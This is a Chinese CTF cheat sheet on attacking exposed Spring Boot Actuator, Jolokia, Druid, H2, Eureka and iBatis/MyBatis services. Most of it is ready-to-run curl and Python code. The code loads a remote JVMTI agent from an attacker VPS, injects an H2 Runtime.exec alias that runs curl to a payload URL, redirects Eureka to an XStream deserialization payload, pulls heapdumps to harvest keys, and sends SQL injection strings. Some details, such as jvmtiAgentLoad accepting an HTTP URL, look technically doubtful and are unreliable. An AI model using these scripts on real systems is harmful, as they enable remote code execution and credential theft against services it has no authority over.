---
title: Jolokia / iBatis 等常见 Java 组件利用
category: web
tags: [jolokia, jmx, actuator, ibatis, 组件利用]
signals: [jolokia 路径, /actuator, jmx 端点, 5077 端口, ibatis 报错, forced3w, jmx-list, 5050 端口, spring boot admin, java 组件版本]
difficulty: medium
source: "NVD / 公开 PoC / HackTricks"
tools: [python, curl, python3 requests]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- 路径 `/jolokia/`、`/actuator/jolokia/`、`/actuator/env`、`/actuator/heapdump` 可访问。
- 打开后返回 `{"request":{...},"value":{"version":...}}` —— Jolokia 的 JMX over HTTP 接口。
- 记录了 `com.alibaba.druid`（Druid 监控）、`iBatis`/`MyBatis` 的错误日志。
- 题目提示"Spring Boot"、"Actuator"、"JMX"、"组件"。
- 变体：`/actuator/env` 可写（`eureka.client.serviceUrl.defaultZone` 注入）。

## 二、原理

**Jolokia** 暴露 JMX MBean 的 HTTP 调用：`/jolokia/exec/<mbean>/<op>` 可调用 MBean 上的方法。很多组件注册了可执行命令的 MBean：

- Apache Tomcat 的 `Catalina:type=Valve`？不行，但 **`com.sun.management:type=DiagnosticCommand`** 的 `jvmtiAgentLoad`、`vmCommandLine` 可以被用来加载 agent → RCE（JDK 11+ 需 `-Djdk.attach.allowAttachSelf`）。
- **Druid** 的 `com.alibaba.druid:type=DruidDataSource` 能改 URL。
- **H2 数据库**的 `INIT=RUNSCRIPT` 通过 `jdbc:h2:...;INIT=...` 执行脚本 → 经典 RCE。
- **Spring Boot Actuator `/env`**：修改 `spring.datasource.url` 或 `eureka.client.serviceUrl.defaultZone`（Eureka 客户端反序列化）→ RCE。

**iBatis / MyBatis**：SQL 注入在 `#{}` 与 `${}` 的差异上；`ibatis` 的 `$` 拼接会导致 SQL 注入。

## 三、解题步骤

1. 枚举 `/actuator` 的端点（`/actuator/env`、`/actuator/jolokia/list`）。
2. 若 Jolokia 可用，调 `jolokia/list` 看 MBean，找可执行类的操作。
3. 若 `/env` 可写，尝试 H2 或 Eureka 注入。
4. 若只有 `heapdump`，下载并用 MAT/`jvisualvm` 找 key/密码。
5. iBatis/MyBatis 走 SQL 注入方向（`${}` 拼接）。

## 四、可直接运行的脚本

Actuator 端点枚举：

```bash
for p in env health info jolokia/list jolokia/version heapdump threaddump mappings beans configprops loggers; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://TARGET/actuator/$p")
  echo "$code  /actuator/$p"
done
```

Jolokia 调 MBean（`jvmtiAgentLoad` 加载 agent 实现 RCE）：

```bash
# 1. 列出可用 MBean
curl -s "http://TARGET/actuator/jolokia/list" | python -m json.tool | head -100

# 2. 调用 DiagnosticCommand 的 vmSystemProperties（只读，验证可调用）
curl -s "http://TARGET/actuator/jolokia/exec/com.sun.management:type=DiagnosticCommand/vmSystemProperties" \
  -H "Content-Type: application/json" -d '{"args":[]}'

# 3. jvmtiAgentLoad 加载远程 agent（JDK 11+ 且允许 attach 时）
curl -s "http://TARGET/actuator/jolokia/exec/com.sun.management:type=DiagnosticCommand/jvmtiAgentLoad" \
  -H "Content-Type: application/json" \
  -d '{"args":["http://VPS:8000/agent.so"]}'

# 4. 用 DiagnosticCommand 的 jvmtiAgentLoad 前，先确认 jolokia 允许 exec
curl -s "http://TARGET/actuator/jolokia/version"
```

Python 版（含 Druid / H2 / Eureka 注入）：

```python
import requests, json

BASE = "http://TARGET/actuator"

def jolokia_exec(mbean, op, args=None):
    url = "%s/jolokia/exec/%s/%s" % (BASE, mbean, op)
    r = requests.post(url, json={"args": args or []}, timeout=10)
    return r.status_code, r.text[:500]

# 1) 探查 MBean
r = requests.get(BASE + "/jolokia/list", timeout=10)
print(r.status_code, r.text[:300])

# 2) Spring Boot /env 写入 H2 RCE
def h2_rce(host_payload_url):
    url = BASE + "/env"
    body = {"name": "spring.datasource.hikari.connection-test-query",
            "value": "CREATE ALIAS EXEC AS 'void e(String s) throws Exception "
                     "{Runtime.getRuntime().exec(s);}'; CALL EXEC('curl %s')" % host_payload_url}
    return requests.post(url, json=body, timeout=10).text

# 3) Eureka 注入（XStream 反序列化）
def eureka_inject():
    url = BASE + "/env"
    body = {"name": "eureka.client.serviceUrl.defaultZone",
            "value": "http://VPS:8000/xstream"}
    return requests.post(url, json=body, timeout=10).text

# 4) heapdump 下载
def dump():
    r = requests.get(BASE + "/heapdump", stream=True, timeout=30)
    open("heap.hprof", "wb").write(r.content)
    return "heap.hprof"

print(jolokia_exec("com.sun.management:type=DiagnosticCommand", "vmSystemProperties"))
```

iBatis / MyBatis 的 `${}` 注入（组件题常见）：

```java
// 漏洞代码：SELECT * FROM users WHERE name = '${name}'   ← 直接拼接
// 正常用法：#{name} 是预编译占位符
// payload: name = ' OR '1'='1
```

```bash
curl "http://TARGET/user?name=1%27%20OR%20%271%27%3D%271"
curl "http://TARGET/user?name=1%27%20UNION%20SELECT%20...--%20"
```

## 五、常见坑 / 变体

- **Actuator 默认只暴露 `health`**：需要 `management.endpoints.web.exposure.include=*`；若只暴露部分，看 `env` 是否可写。
- **`/env` 写入后必须触发刷新**：`POST /actuator/refresh` 或 `restart`。
- **Jolokia 的写法**：`/exec/<mbean>/<op>`，mbean 里 `:` 和 `=` 需原样保留，`args` 用 JSON。
- **jvmtiAgentLoad 需要 JDK 11+ 且 attach 允许**：JDK 8 用 `com.sun.management:type=DiagnosticCommand/jvmtiAgentLoad` 可能不存在，改 `vmCommandLine`。
- **heapdump 太大**：`-Xmx` 决定大小，用 `grep -a` 直接搜 key 更快。
- 变体：**Druid 未授权**（`/druid/index.html`）→ 看 SQL 监控、改数据源。
- 变体：**Spring Cloud Gateway Actuator**（CVE-2022-22947）→ `POST /actuator/gateway/routes` + `/actuator/gateway/refresh` 注入 SPEL。
- 变体：**Jolokia 代理模式 SSRF**：`/jolokia/proxy/http://127.0.0.1:6379/` 可打内网（`target` 参数）；Jolokia 本身也有过 Tomcat Valve 类漏洞（CVE-2018-1000861 是 Jenkins，别混淆）。

## 六、参考来源

- [NVD - Spring Boot Actuator 相关 CVE 检索](https://nvd.nist.gov/vuln/search/results?query=spring+boot+actuator)
- [Jolokia 官方文档](https://jolokia.org/reference/html/index.html)
- [HackTricks - Spring Actuators](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/spring-actuators.html)
- [PayloadsAllTheThings - Spring Boot](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [NVD - CVE-2022-22947（Gateway Actuator）](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)
